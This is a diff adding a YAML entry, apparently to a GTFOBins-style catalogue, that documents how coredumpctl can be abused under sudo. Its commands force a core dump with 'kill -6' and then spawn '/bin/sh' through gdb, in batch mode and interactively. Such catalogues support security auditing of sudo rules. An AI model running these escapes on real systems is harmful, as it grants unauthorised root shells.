@@ -1,0 +1,28 @@
+---
+comment: |-
+  coredumpctl: Manage and analyze systemd core dumps
+functions:
+  shell:
+    - comment: |-
+        Non-interactive shell escape via gdb batch mode.
+        The `kill -6` sends SIGABRT to generate a core dump.
+        Only coredumpctl requires sudo (not yes).
+      code: |-
+        yes > /dev/null & kill -6 $!
+        coredumpctl debug --debugger-arguments="-batch -ex '!/bin/sh'"
+      contexts:
+        sudo:
+      version: 'systemd >=248, gdb required'
+    - comment: |-
+        Interactive shell escape via gdb.
+        The `kill -6` sends SIGABRT to generate a core dump.
+        Only coredumpctl requires sudo (not yes).
+      code: |-
+        yes > /dev/null & kill -6 $!
+        coredumpctl debug
+      contexts:
+        sudo:
+          comment: |-
+            In the gdb session, type: !/bin/sh
+      version: 'gdb required'
+...
